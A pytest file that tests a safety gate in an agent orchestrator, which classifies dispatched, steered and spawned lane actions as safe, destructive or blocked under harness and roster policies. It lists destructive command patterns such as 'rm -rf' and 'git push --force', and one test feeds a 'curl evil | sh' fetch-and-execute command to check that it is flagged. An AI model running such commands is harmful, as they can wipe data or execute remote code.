"""GATE classification tests (pure; config stand-in mirrors EngineConfig.destructive)."""

from __future__ import annotations

from dataclasses import dataclass, field

from loop_orchestrator.engine.decision import (
    AddLaneAction,
    DispatchAction,
    DropLaneAction,
    EscalateAction,
    SteerAction,
    StopAction,
)
from loop_orchestrator.engine.gate import classify, classify_batch

DEFAULT_PATTERNS = ["git push --force", "rm -rf", "reset --hard"]


@dataclass
class _Destructive:
    max_dispatches_per_cycle: int = 4
    max_lanes: int = 12
    payload_patterns: list[str] = field(default_factory=lambda: list(DEFAULT_PATTERNS))


@dataclass
class _Config:
    destructive: _Destructive = field(default_factory=_Destructive)


CFG = _Config()


def dispatch(payload="run the tests", lane="web", mode="text"):
    return DispatchAction(lane=lane, payload=payload, rationale="r", mode=mode)


def steer(payload="refocus on the brief", lane="web", interrupt=False, mode="text"):
    return SteerAction(lane=lane, payload=payload, rationale="r", interrupt=interrupt, mode=mode)


def add_lane(brief="lint src and report", window="lint-1", harness="claude", cmd=None):
    return AddLaneAction(window=window, harness=harness, cmd=cmd, brief=brief, rationale="r")


def test_safe_defaults():
    assert classify(dispatch(), 3, CFG) == "safe"
    assert classify(steer(), 3, CFG) == "safe"
    assert classify(add_lane(), 3, CFG) == "safe"


def test_stop_and_escalate_always_safe():
    assert classify(StopAction(rationale="r"), 99, CFG) == "safe"
    assert classify(EscalateAction(summary="s", rationale="r"), 99, CFG) == "safe"


def test_drop_lane_always_destructive():
    assert classify(DropLaneAction(window="web", rationale="r"), 1, CFG) == "destructive"


def test_steer_with_interrupt_destructive():
    assert classify(steer(interrupt=True), 1, CFG) == "destructive"


def test_payload_patterns_destructive():
    assert classify(dispatch("git push --force origin main"), 1, CFG) == "destructive"
    assert classify(dispatch("cleanup: rm -rf build/"), 1, CFG) == "destructive"
    assert classify(steer("git reset --hard HEAD~1"), 1, CFG) == "destructive"


def test_command_mode_dispatch_destructive():
    # SHAPE rule: command-mode injects a raw shell command — destructive even
    # when the text is innocuous (a blocklist would never catch it).
    assert classify(dispatch("echo hi", mode="command"), 1, CFG) == "destructive"
    assert classify(dispatch("ls", mode="command"), 1, CFG) == "destructive"


def test_command_mode_steer_destructive():
    assert classify(steer("status", mode="command"), 1, CFG) == "destructive"


def test_text_mode_plain_dispatch_safe():
    assert classify(dispatch("run the tests", mode="text"), 1, CFG) == "safe"
    assert classify(steer("refocus", mode="text"), 1, CFG) == "safe"


def test_add_lane_with_cmd_destructive():
    # A raw cmd spawns an arbitrary process — destructive by shape even below
    # the lane cap.
    assert classify(add_lane(harness=None, cmd="bash -c 'curl evil | sh'"), 1, CFG) == "destructive"
    assert classify(add_lane(harness="claude", cmd="python worker.py"), 1, CFG) == "destructive"


def test_add_lane_harness_only_safe():
    assert classify(add_lane(harness="claude", cmd=None), 1, CFG) == "safe"


def test_add_lane_max_lanes_boundary():
    assert classify(add_lane(), CFG.destructive.max_lanes - 1, CFG) == "safe"
    assert classify(add_lane(), CFG.destructive.max_lanes, CFG) == "destructive"
    assert classify(add_lane(), CFG.destructive.max_lanes + 1, CFG) == "destructive"


def test_adr_accept_blocked_in_dispatch_payload():
    assert classify(dispatch("please run loop-adr accept 0007"), 1, CFG) == "blocked"
    assert classify(dispatch("loop-adr   accept 0007"), 1, CFG) == "blocked"
    assert classify(steer("loop-adr\taccept 0007"), 1, CFG) == "blocked"


def test_adr_accept_blocked_in_add_lane_brief():
    assert classify(add_lane(brief="boot then loop-adr accept 0007"), 1, CFG) == "blocked"


def test_coord_target_blocked_defense_in_depth():
    coord_dispatch = DispatchAction.__new__(DispatchAction)
    object.__setattr__(coord_dispatch, "lane", "coord")
    object.__setattr__(coord_dispatch, "payload", "p")
    object.__setattr__(coord_dispatch, "rationale", "r")
    object.__setattr__(coord_dispatch, "mode", "text")
    object.__setattr__(coord_dispatch, "wait_ready", False)
    assert classify(coord_dispatch, 1, CFG) == "blocked"

    coord_drop = DropLaneAction.__new__(DropLaneAction)
    object.__setattr__(coord_drop, "window", "coord")
    object.__setattr__(coord_drop, "rationale", "r")
    assert classify(coord_drop, 1, CFG) == "blocked"


def test_blocked_wins_over_destructive():
    assert classify(steer("loop-adr accept 0001", interrupt=True), 1, CFG) == "blocked"


def test_batch_fan_out_upgrade():
    actions = [dispatch(f"task {i}") for i in range(4)] + [steer("nudge")]
    assert classify_batch(actions, 1, CFG) == ["destructive"] * 5


def test_batch_at_limit_no_upgrade():
    actions = [dispatch(f"task {i}") for i in range(4)]
    assert classify_batch(actions, 1, CFG) == ["safe"] * 4


def test_batch_upgrade_spares_non_dispatch_and_keeps_blocked():
    actions = [
        dispatch("task a"),
        dispatch("task b"),
        dispatch("task c"),
        dispatch("loop-adr accept 0007"),
        steer("nudge"),
        StopAction(rationale="r"),
    ]
    assert classify_batch(actions, 1, CFG) == [
        "destructive",
        "destructive",
        "destructive",
        "blocked",
        "destructive",
        "safe",
    ]


# ── harness governance pass (T0013, plan A.2) ──────────────────────────────
# These use the REAL EngineConfig/HarnessPolicy (the _Config stand-in above
# predates governance and is only touched on the roster=None path).

from loop_orchestrator.engine.config import EngineConfig, HarnessPolicy  # noqa: E402
from loop_orchestrator.engine.gate import classify_harness, govern_add_lanes  # noqa: E402


def _entry(name, present=True, tags="code", cost="medium", autonomy="attended", drift="med"):
    return {
        "name": name,
        "present": present,
        "capability_tags": tags,
        "cost_tier": cost,
        "autonomy_class": autonomy,
        "auth_requirement": "account",
        "health_probe": "",
        "drift_pins": drift,
    }


ROSTER = {
    "claude": _entry(
        "claude", tags="brain,ingest,code,ops", cost="high", autonomy="unattended", drift="low"
    ),
    "codex": _entry("codex", tags="code,brain", cost="high", autonomy="unattended", drift="high"),
    "pi": _entry("pi", tags="product,synthesis"),
    "amp": _entry("amp", tags="search,research", cost="high", autonomy="unattended", drift="high"),
    "droid": _entry("droid", present=False),
}


def policy_cfg(**kwargs) -> EngineConfig:
    return EngineConfig(harness_policy=HarnessPolicy(**kwargs))


def role_lane(harness="claude", role="infra", auto_approve=False, window="gov-1"):
    return AddLaneAction(
        window=window,
        harness=harness,
        brief="b",
        rationale="r",
        role=role,
        auto_approve=auto_approve,
    )


def test_roster_none_is_pass_through_even_with_policy():
    cfg = policy_cfg(deny=["claude"])
    assert classify(role_lane("claude"), 1, cfg) == "safe"
    assert classify_harness(role_lane("claude"), cfg, None) is None


def test_empty_policy_is_pass_through_even_with_roster():
    cfg = EngineConfig()
    assert classify(role_lane("amp", auto_approve=True), 1, cfg, ROSTER) == "safe"
    assert classify_harness(role_lane("amp"), cfg, ROSTER) is None
    assert govern_add_lanes([role_lane("amp")], cfg, ROSTER) == ([role_lane("amp")], [])


def test_denied_harness_blocked():
    cfg = policy_cfg(deny=["amp"])
    assert classify(role_lane("amp"), 1, cfg, ROSTER) == "blocked"


def test_unknown_to_roster_blocked():
    cfg = policy_cfg(allow=["claude"])
    # the registry-typo case: 'cluade' never reaches the bash boundary
    assert classify(role_lane("cluade"), 1, cfg, ROSTER) == "blocked"


def test_not_in_allowlist_blocked_without_role_default():
    cfg = policy_cfg(allow=["claude", "pi"])
    assert classify(role_lane("codex"), 1, cfg, ROSTER) == "blocked"


def test_allowlisted_harness_safe():
    cfg = policy_cfg(allow=["claude", "pi"])
    assert classify(role_lane("claude"), 1, cfg, ROSTER) == "safe"


def test_role_tag_map_mismatch_blocked():
    cfg = policy_cfg(role_tag_map={"infra": ["ops", "code"]})
    assert classify(role_lane("pi", role="infra"), 1, cfg, ROSTER) == "blocked"
    # unmapped role: no tag constraint
    assert classify(role_lane("pi", role="product"), 1, cfg, ROSTER) == "safe"


def test_rewrite_to_role_default():
    cfg = policy_cfg(role_tag_map={"infra": ["ops"]}, role_defaults={"infra": "claude"})
    actions, events = govern_add_lanes([role_lane("pi", role="infra")], cfg, ROSTER)
    assert len(actions) == 1
    assert actions[0].harness == "claude"
    assert events == [
        {
            "event": "harness-rewrite",
            "window": "gov-1",
            "role": "infra",
            "from_harness": "pi",
            "to_harness": "claude",
        }
    ]
    # the rewritten action then classifies clean
    assert classify(actions[0], 1, cfg, ROSTER) == "safe"


def test_no_rewrite_when_default_itself_not_allowed():
    cfg = policy_cfg(
        role_tag_map={"infra": ["ops"]}, role_defaults={"infra": "pi"}, deny=["claude"]
    )
    actions, events = govern_add_lanes([role_lane("codex", role="infra")], cfg, ROSTER)
    assert actions[0].harness == "codex"  # untouched: pi has no 'ops' tag either
    assert events == []
    assert classify(actions[0], 1, cfg, ROSTER) == "blocked"


def test_cost_ceiling_exceeded_destructive():
    cfg = policy_cfg(cost_ceiling="medium")
    assert classify(role_lane("claude"), 1, cfg, ROSTER) == "destructive"
    assert classify(role_lane("pi"), 1, cfg, ROSTER) == "safe"


def test_autonomy_cap_exceeded_destructive():
    cfg = policy_cfg(autonomy_cap="attended")
    assert classify(role_lane("codex"), 1, cfg, ROSTER) == "destructive"
    assert classify(role_lane("pi"), 1, cfg, ROSTER) == "safe"


def test_roster_missing_harness_destructive():
    cfg = policy_cfg(allow=["droid", "claude"])
    assert classify(role_lane("droid"), 1, cfg, ROSTER) == "destructive"


def test_roster_health_word_destructive():
    cfg = policy_cfg(allow=["codex", "claude"])
    sick = {**ROSTER, "codex": {**ROSTER["codex"], "health": "unauthenticated"}}
    assert classify(role_lane("codex"), 1, cfg, sick) == "destructive"


def test_high_drift_unattended_high_risk_destructive():
    cfg = policy_cfg(allow=["codex", "claude"])  # high_risk_roles defaults to ["infra"]
    assert classify(role_lane("codex", role="infra", auto_approve=True), 1, cfg, ROSTER) == (
        "destructive"
    )
    # attended, or a low-risk role, stays safe
    assert classify(role_lane("codex", role="infra"), 1, cfg, ROSTER) == "safe"
    assert classify(role_lane("codex", role="search", auto_approve=True), 1, cfg, ROSTER) == "safe"


def test_blocked_beats_harness_destructive_and_shape_rules_survive():
    cfg = policy_cfg(deny=["amp"])
    # denied + raw cmd: blocked wins over the cmd shape rule
    denied_with_cmd = AddLaneAction(
        window="gov-2", harness="amp", cmd="python w.py", brief="b", rationale="r"
    )
    assert classify(denied_with_cmd, 1, cfg, ROSTER) == "blocked"
    # allowed harness + raw cmd: the shape rule still fires
    allowed_with_cmd = AddLaneAction(
        window="gov-3", harness="claude", cmd="python w.py", brief="b", rationale="r"
    )
    assert classify(allowed_with_cmd, 1, cfg, ROSTER) == "destructive"


def test_classify_batch_threads_roster():
    cfg = policy_cfg(deny=["amp"])
    actions = [role_lane("amp", window="gov-4"), dispatch("run tests")]
    assert classify_batch(actions, 1, cfg, ROSTER) == ["blocked", "safe"]


# ── F1 dispatch-target governance pass (T0017, Phase 2) ─────────────────────
# A mode='text' dispatch/steer (an agent BRIEF) is governed by the TARGET
# lane's harness: agent lanes are fine; non-agent (shell/mprocs — empty
# oneshot_template) lanes gate (destructive); a target unknown to the lane
# snapshot or to the roster is blocked. mode='command' is never F1's concern.
# Activation rides on the per-cycle lane snapshot, which the loop resolves only
# under a non-empty policy — so lane_harnesses=None (the default) is inert.

# roster entries carry oneshot_template (added to the roster JSON for F1): a
# non-empty template => the harness can act on a brief (agent lane).
F1_ROSTER = {
    "claude": {"name": "claude", "present": True, "oneshot_template": "claude -p {prompt}"},
    "shell": {"name": "shell", "present": True, "oneshot_template": ""},
    "mprocs": {"name": "mprocs", "present": True, "oneshot_template": ""},
}
# lane -> harness: the per-cycle snapshot the loop builds from substrate.lanes().
F1_LANES = {"web": "claude", "docs": "shell", "ops-top": "mprocs"}
F1_CFG = EngineConfig()


def test_f1_text_brief_to_agent_lane_is_safe():
    assert classify(dispatch(lane="web"), 1, F1_CFG, F1_ROSTER, F1_LANES) == "safe"
    assert classify(steer(lane="web"), 1, F1_CFG, F1_ROSTER, F1_LANES) == "safe"


def test_f1_text_brief_to_shell_lane_is_destructive():
    assert classify(dispatch(lane="docs"), 1, F1_CFG, F1_ROSTER, F1_LANES) == "destructive"
    assert classify(steer(lane="docs"), 1, F1_CFG, F1_ROSTER, F1_LANES) == "destructive"


def test_f1_text_brief_to_dashboard_lane_is_destructive():
    assert classify(dispatch(lane="ops-top"), 1, F1_CFG, F1_ROSTER, F1_LANES) == "destructive"


def test_f1_command_to_shell_lane_stays_destructive_not_blocked():
    # command mode to a shell lane is how you run shell commands — left to the
    # existing shape rule (destructive), never F1-gated.
    assert (
        classify(dispatch(lane="docs", mode="command"), 1, F1_CFG, F1_ROSTER, F1_LANES)
        == "destructive"
    )


def test_f1_unknown_target_lane_is_blocked():
    assert classify(dispatch(lane="ghost"), 1, F1_CFG, F1_ROSTER, F1_LANES) == "blocked"


def test_f1_target_harness_unknown_to_roster_is_blocked():
    lanes = {"web": "claude", "weird": "nosuch"}
    assert classify(dispatch(lane="weird"), 1, F1_CFG, F1_ROSTER, lanes) == "blocked"


def test_f1_inert_without_lane_snapshot():
    # roster threaded but no lane snapshot, or neither: no F1 opinion (today).
    assert classify(dispatch(lane="docs"), 1, F1_CFG, F1_ROSTER, None) == "safe"
    assert classify(dispatch(lane="docs"), 1, F1_CFG) == "safe"


def test_f1_command_to_unknown_lane_is_not_blocked():
    # F1's block applies to text briefs only; command to an unknown lane stays
    # on the shape rule (destructive), not blocked.
    assert (
        classify(dispatch(lane="ghost", mode="command"), 1, F1_CFG, F1_ROSTER, F1_LANES)
        == "destructive"
    )


def test_f1_classify_batch_threads_lane_harnesses():
    actions = [dispatch(lane="web"), dispatch(lane="docs"), dispatch(lane="ghost")]
    assert classify_batch(actions, 1, F1_CFG, F1_ROSTER, F1_LANES) == [
        "safe",
        "destructive",
        "blocked",
    ]


# ── T0019 standing-lane drop guard (Phase 3) ────────────────────────────────
# A drop_lane targeting a declared 'standing' lane is BLOCKED; worker/unknown
# stay DESTRUCTIVE. Activation rides on the per-cycle lane snapshot (lane_kinds),
# which the loop resolves only under a non-empty policy — None = today's behavior.

T0019_KINDS = {"coord": "standing", "web": "standing", "helper": "worker"}


def _drop(window="helper"):
    return DropLaneAction(window=window, rationale="r")


def test_t0019_drop_standing_lane_is_blocked():
    assert classify(_drop("web"), 1, F1_CFG, None, None, T0019_KINDS) == "blocked"


def test_t0019_drop_worker_lane_is_destructive():
    assert classify(_drop("helper"), 1, F1_CFG, None, None, T0019_KINDS) == "destructive"


def test_t0019_drop_unknown_lane_is_destructive():
    assert classify(_drop("ghost"), 1, F1_CFG, None, None, T0019_KINDS) == "destructive"


def test_t0019_drop_without_lane_snapshot_is_destructive():
    # no lane_kinds threaded (e.g. empty policy) => today's behavior, unchanged.
    assert classify(_drop("web"), 1, F1_CFG) == "destructive"


def test_t0019_classify_batch_threads_lane_kinds():
    actions = [_drop("web"), _drop("helper")]
    assert classify_batch(actions, 1, F1_CFG, None, None, T0019_KINDS) == ["blocked", "destructive"]


# ── T0020 reuse-before-spawn HARD rule (Phase 3) ────────────────────────────
# add_lane for a role that already has an IDLE worker, at/over the role's
# concurrency_allowance, classifies DESTRUCTIVE (prefer reuse). role_workers =
# {role: {"idle": n, "live": n}} from the loop; None / empty policy = no-op.


def _addlane(role="routes-and-flows", harness="claude", window="w-new"):
    return AddLaneAction(window=window, harness=harness, brief="b", rationale="r", role=role)


def test_t0020_reuse_before_spawn_is_destructive():
    cfg = policy_cfg(role_rules={"routes-and-flows": {"concurrency_allowance": 1}})
    workers = {"routes-and-flows": {"idle": 1, "live": 1}}
    assert classify(_addlane(), 1, cfg, ROSTER, None, None, workers) == "destructive"


def test_t0020_default_allowance_is_one_without_role_rule():
    cfg = policy_cfg(deny=["amp"])  # non-empty policy, no role_rules -> default 1
    workers = {"routes-and-flows": {"idle": 1, "live": 1}}
    assert classify(_addlane(), 1, cfg, ROSTER, None, None, workers) == "destructive"


def test_t0020_under_concurrency_allowance_is_safe():
    cfg = policy_cfg(role_rules={"checks": {"concurrency_allowance": 2}})
    workers = {"checks": {"idle": 1, "live": 1}}  # live(1) < allowance(2): room to spawn
    assert classify(_addlane(role="checks"), 1, cfg, ROSTER, None, None, workers) == "safe"


def test_t0020_busy_worker_does_not_force_reuse():
    cfg = policy_cfg(role_rules={"routes-and-flows": {"concurrency_allowance": 1}})
    workers = {"routes-and-flows": {"idle": 0, "live": 1}}  # the worker is busy
    assert classify(_addlane(), 1, cfg, ROSTER, None, None, workers) == "safe"


def test_t0020_reuse_inert_under_empty_policy():
    workers = {"routes-and-flows": {"idle": 5, "live": 5}}
    assert classify(_addlane(), 1, EngineConfig(), ROSTER, None, None, workers) == "safe"


def test_t0020_reuse_inert_without_worker_snapshot():
    cfg = policy_cfg(role_rules={"routes-and-flows": {"concurrency_allowance": 1}})
    assert classify(_addlane(), 1, cfg, ROSTER) == "safe"  # role_workers=None


def test_t0020_classify_batch_threads_role_workers():
    cfg = policy_cfg(role_rules={"routes-and-flows": {"concurrency_allowance": 1}})
    workers = {"routes-and-flows": {"idle": 1, "live": 1}}
    actions = [_addlane(window="w1"), _addlane(role="other", window="w2")]
    # first role has an idle worker -> reuse; second role has none -> safe
    assert classify_batch(actions, 1, cfg, ROSTER, None, None, workers) == ["destructive", "safe"]


# ── T0026 conditional worktree provisioning rule (Phase 4) ──────────────────

from loop_orchestrator.engine.gate import (  # noqa: E402
    needs_integration_lane,
    should_provision_worktree,
)


def test_t0026_dormant_at_concurrency_one():
    # The sole serialized code-writer (no other live, no dirty peer) stays SHARED.
    assert should_provision_worktree(0) is False
    assert should_provision_worktree(0, dirty_peers=False) is False


def test_t0026_worktree_when_a_peer_is_concurrent():
    # A second concurrent code-writer => isolate the new lane.
    assert should_provision_worktree(1) is True
    assert should_provision_worktree(3) is True


def test_t0026_worktree_when_a_peer_is_dirty():
    # Even alone, a dirty peer means parallelism is not serialized.
    assert should_provision_worktree(0, dirty_peers=True) is True


def test_t0026_integration_lane_threshold():
    assert needs_integration_lane(2) is False
    assert needs_integration_lane(3) is True
    assert needs_integration_lane(5) is True
    assert needs_integration_lane(3, threshold=4) is False


# ── F6 (T0027): lane harness from lane-config fallback ──────────────────────
# loop.py builds lane_harnesses = tmux-tag map, then fills gaps from the
# lane-config (setdefault: tag wins, config is the authoritative per-lane
# fallback). These tests pin the dispatch-target verdicts on the merged map.


def _merge(tag_map: dict, config_map: dict) -> dict:
    """Mirror loop.py's F6 merge: tag fast-path wins; config fills the gaps."""
    merged = dict(tag_map)
    for lane, harness in config_map.items():
        merged.setdefault(lane, harness)
    return merged


def test_f6_untagged_lane_resolves_from_config_not_blocked():
    # Pre-existing session: the base lane carries NO tmux tag.
    tag_only = {}  # web absent -> dispatch would BLOCK (the F6 bug)
    assert classify(dispatch(lane="web"), 1, F1_CFG, F1_ROSTER, tag_only) == "blocked"
    # With the config fallback, web resolves to claude (an agent) -> not blocked.
    merged = _merge(tag_only, {"web": "claude"})
    assert classify(dispatch(lane="web"), 1, F1_CFG, F1_ROSTER, merged) == "safe"


def test_f6_mixed_window_resolves_each_lane_per_lane():
    # A multi-pane window can't carry per-lane tags; config disambiguates.
    merged = _merge({}, {"validate-left": "claude", "validate-right": "shell"})
    assert classify(dispatch(lane="validate-left"), 1, F1_CFG, F1_ROSTER, merged) == "safe"
    assert classify(dispatch(lane="validate-right"), 1, F1_CFG, F1_ROSTER, merged) == "destructive"


def test_f6_correctly_tagged_single_pane_unchanged():
    # Tag present and agreeing with config: setdefault keeps the tag -> identical.
    merged = _merge({"web": "claude"}, {"web": "claude"})
    assert merged == {"web": "claude"}
    assert classify(dispatch(lane="web"), 1, F1_CFG, F1_ROSTER, merged) == "safe"
